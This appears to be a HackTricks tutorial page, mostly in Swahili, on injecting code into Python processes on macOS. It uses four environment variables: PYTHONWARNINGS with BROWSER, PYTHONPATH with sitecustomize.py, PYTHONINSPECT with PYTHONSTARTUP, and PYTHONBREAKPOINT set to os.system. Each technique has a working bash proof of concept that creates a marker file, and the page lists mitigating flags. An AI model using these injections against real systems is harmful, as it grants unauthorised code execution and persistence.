# macOS Python Application Injection

{{#include ../../../banners/hacktricks-training.md}}

## Kupitia environment variables za `PYTHONWARNINGS` na `BROWSER`

Ikiwa mshambuliaji anaweza kudhibiti environment ya mchakato wa Python, mchanganyiko wa `PYTHONWARNINGS` na `BROWSER` unaweza kusababisha utekelezaji wa amri wakati Python ina-import module ya `antigravity` inapochakata chaguo la warning lililotengenezwa mahsusi. Mbinu hii hutegemea `antigravity` kufungua URL kwa kutumia module ya Python ya `webbrowser`, ambayo huzingatia environment variable ya `BROWSER`.<sup>[[1]](#references)</sup>

```bash
# Generate an example Python script.
echo "print('hi')" > /tmp/script.py

# Create /tmp/hacktricks through the inherited environment.
PYTHONWARNINGS="all:0:antigravity.x:0:0" BROWSER="/bin/sh -c 'touch /tmp/hacktricks' #%s" python3 /tmp/script.py

# With isolated mode, inject the warning rule using -W instead.
BROWSER="/bin/sh -c 'touch /tmp/hacktricks' #%s" python3 -I -W all:0:antigravity.x:0:0 /tmp/script.py
```

## Kupitia `PYTHONPATH` na `sitecustomize.py`

Wakati wa kuanza kwa kawaida, module ya Python ya `site` huongeza njia maalum za site kisha hujaribu ku-import module inayoitwa `sitecustomize`. Kwa kuweka saraka inayoweza kusomwa na mshambuliaji mwanzoni mwa `PYTHONPATH`, mshambuliaji anayedhibiti mazingira ya process anaweza kufanya Python i-import payload kabla ya script lengwa. Bendera ya `-S` huzima uanzishaji wa kiotomatiki wa `site`, huku isolated mode (`-I`) ikipuuza `PYTHONPATH` na kuashiria matumizi ya `-s` na `-E`.<sup>[[2]](#references)[[3]](#references)</sup>

```bash
mkdir -p /tmp/python-startup
cat >/tmp/python-startup/sitecustomize.py <<'EOF'
from pathlib import Path
Path('/tmp/python-sitecustomize-executed').touch()
EOF

PYTHONPATH=/tmp/python-startup python3 /tmp/script.py
```

Kwa persistence kupitia site ya mtumiaji inayoweza kuandikwa badala ya `PYTHONPATH` iliyorithiwa, angalia [Python `.pth`, `.start`, and `usercustomize` startup files](../../macos-auto-start-locations.md#python-startup-files-pth--usercustomize--sitecustomize).

## Kupitia `PYTHONINSPECT` na `PYTHONSTARTUP` baada ya script

Kwenye CPython 3.13+, script inayoanzishwa ikiwa na `PYTHONINSPECT=1` huingia kwenye session ya mwingiliano inapokamilika. Ikiwa ingizo la kawaida ni terminal na PyREPL inapatikana, session hiyo hutekeleza faili iliyotajwa na `PYTHONSTARTUP` **baada ya** script lengwa na kabla ya prompt. Kwa hivyo, mshambulizi anayedhibiti variables zote mbili zilizorithiwa na faili ya startup inayoweza kusomeka anaweza kutekeleza code kwenye process lengwa bila kurekebisha script yake. Hiki ni kichocheo cha baada ya script, si hook ya kawaida ya startup.<sup>[[3]](#references)[[5]](#references)[[6]](#references)</sup>

```bash
cat >/tmp/python-post.py <<'EOF'
from pathlib import Path
Path('/tmp/python-post-executed').touch()
EOF

# Run from a terminal using CPython 3.13+; exit the resulting prompt with Ctrl-D.
PYTHONINSPECT=1 PYTHONSTARTUP=/tmp/python-post.py python3.13 /tmp/script.py
```

Mlolongo huu hautekelezi faili la startup kwenye matoleo ya zamani ya CPython, stdin isiyo ya terminal, au wakati `PYTHON_BASIC_REPL` inalazimisha REPL ya msingi. `-E` na `-I` hupuuza vigeu vya `PYTHON*`. Kagua interpreter halisi na muktadha wa terminal kabla ya kutegemea njia hii.<sup>[[3]](#references)[[5]](#references)</sup>

## Kupitia `PYTHONBREAKPOINT`

Tangu Python 3.7 (PEP 553), `breakpoint()` iliyojengewa ndani huagiza na kuita chochote ambacho `sys.breakpointhook` inaelekeza, na lengo hilo huchukuliwa kutoka kwa kigeu cha mazingira cha **`PYTHONBREAKPOINT`** (`package.module.callable`). Kuagiza module iliyotajwa na kuita callable hutokea kabla debugger haijaonekana kwa kawaida, kwa hivyo mshambuliaji anayedhibiti mazingira ya mchakato unaofikia `breakpoint()` (hali ya kawaida kwenye script za matengenezo/debug, na wakati mwingine huachwa kwenye njia za production) hupata utekelezaji wa code.<sup>[[4]](#references)</sup>

```bash
cat >/tmp/bp.py <<'EOF'
import sys
print("before")
breakpoint(*sys.argv[1:])
EOF

# breakpoint() invokes the chosen callable with its arguments
PYTHONBREAKPOINT="os.system" python3 /tmp/bp.py "touch /tmp/py-bp-executed"
ls -la /tmp/py-bp-executed
```

Tofauti na `PYTHONWARNINGS`/`PYTHONPATH`, hii inahitaji target ifike kwenye mwito wa `breakpoint()`, lakini pia hufanya kazi kupitia **athari za import** za module iliyotajwa pekee (ielekeze kwenye module yoyote inayoweza kuingizwa — kwa mfano, iliyowekwa mwanzo kwenye `PYTHONPATH` — ambayo huendesha code yake ya kiwango cha juu). Kuweka `PYTHONBREAKPOINT=0` huzima hook kabisa.



## References

- [1] [Hacking kwa kutumia Vigezo vya Mazingira - elttam](https://www.elttam.com/blog/env/)
- [2] [site — Hook ya usanidi mahususi kwa site](https://docs.python.org/3/library/site.html)
- [3] [Python: mstari wa amri na mazingira](https://docs.python.org/3/using/cmdline.html)
- [4] [PEP 553 — breakpoint() iliyojengwa ndani na PYTHONBREAKPOINT](https://peps.python.org/pep-0553/)
- [5] [Usambazaji wa CPython interpreter REPL (`Modules/main.c`)](https://github.com/python/cpython/blob/v3.15.2/Modules/main.c)
- [6] [Utekelezaji wa faili ya kuanzisha ya CPython PyREPL (`Lib/_pyrepl/main.py`)](https://github.com/python/cpython/blob/v3.15.2/Lib/_pyrepl/main.py)
{{#include ../../../banners/hacktricks-training.md}}
